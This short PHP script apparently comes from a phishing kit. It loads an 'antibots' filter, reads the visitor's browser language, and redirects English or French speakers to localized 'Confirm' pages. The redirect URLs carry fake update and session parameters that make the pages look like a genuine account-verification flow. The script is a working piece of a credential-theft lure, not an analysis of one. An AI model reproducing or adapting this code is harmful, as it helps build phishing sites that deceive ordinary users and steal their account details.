<?php
include 'antibots.php';

$langkilleyou = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

switch ($langkilleyou){
		
	case "en":
        //echo "PAGE EN";
        header("Location: EN/Confirm.php?update=9age02ptak&Session=vsztequlskbcu0xrxbs3voiz1t7p8pdzts82n40k32nsxlxfj09qsz5dz9plzyk45");
        break; 
		
	case "fr":
        //echo "PAGE EN";
        header("Location: FR/Confirmez.php?update=9age02ptak&Session=vfgg4s6d46g4s64bxqlmqjkshmcjbqjbslmaihwqbcqfblqbvlqjbsufuoqbjfb");
        break; 
		
    default:
        //echo "PAGE EN - Setting Default";
        header("Location: EN/Confirm.php?update=9age02ptak&Session=vsztequlskbcu0xrxbs3voiz1t7p8pdzts82n40k32nsxlxfj09qsz5dz9plzyk45");
        break; 
}

?>